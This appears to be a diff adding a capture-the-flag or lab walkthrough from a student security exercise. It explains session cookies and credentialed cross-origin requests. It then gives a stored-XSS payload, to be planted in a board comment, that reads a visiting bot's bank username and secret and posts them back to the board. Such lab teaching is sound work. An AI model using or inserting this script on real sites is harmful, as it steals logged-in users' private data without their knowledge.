@@ -1,0 +1,72 @@
+
+
+First thing's first, login to bank.wcsc
+
+Note that once logged in, the page will display your secret.
+
+Then head over to board and spit the following into a comment:
+
+<iframe src="http://bank.wcsc"></iframe>
+
+Cool, we can see the bank. Oh crap but how!
+
+Because we're embedding the bank page in our page. Check the network tab, see
+the request. Look at the headers and see that it sends the PHPSESSID cookie.
+
+The PHPSESSID cookie contains the unique ID of our PHP Session.
+
+What's a PHP session? It's a way for PHP to keep track of values it has saved
+for you on the server. It makes it an easy way for the server to remember you're
+logged in. But if someone steals this cookie, then they have full control over you.
+
+Any cookies set by a domain will be sent to the domain on all requests, whether
+ajax or not.
+
+Speaking of AJAX, how do we pull the page with Ajax? Well, you have to include
+the withCredentials flag in order to make requests with cookies. This is part
+of the browser's HTTP access control (CORS) system.
+
+$.ajax("http://bank.wcsc", {
+    type: "GET",
+    success: (a) => console.log(a),
+    xhrFields: {
+        withCredentials: true
+    },
+    crossDomain: true
+});
+
+Bam, what did we get? the contents of the page. If you go to the network tab
+and click the preview button you can get a render of the page returned.
+
+What's in this page? Our secret!
+
+So we just pulled our bank secret from a completely different domain without
+the user even knowing!
+
+Embed this script in the page through a comment, and when the robot
+bot zooms through, you can steal their bank secret.
+
+$.ajax("http://bank.wcsc", {
+    type: "GET",
+    xhrFields: {
+        withCredentials: true
+    },
+    crossDomain: true,
+    success: function(data){
+        data = $(data);
+
+        var user = data.find('#username').text().trim();
+        var secret = data.find('#secret').text().trim();
+
+        console.log('u: ',user, 's: ',secret);
+
+        if(user !== 'robot'){
+            return;
+        }
+
+        $.post(window.location.href, {
+            username: 'We Found Data!',
+            comment: 'User: ' + user + "\n\nSecret: " + secret
+        });
+    }
+});
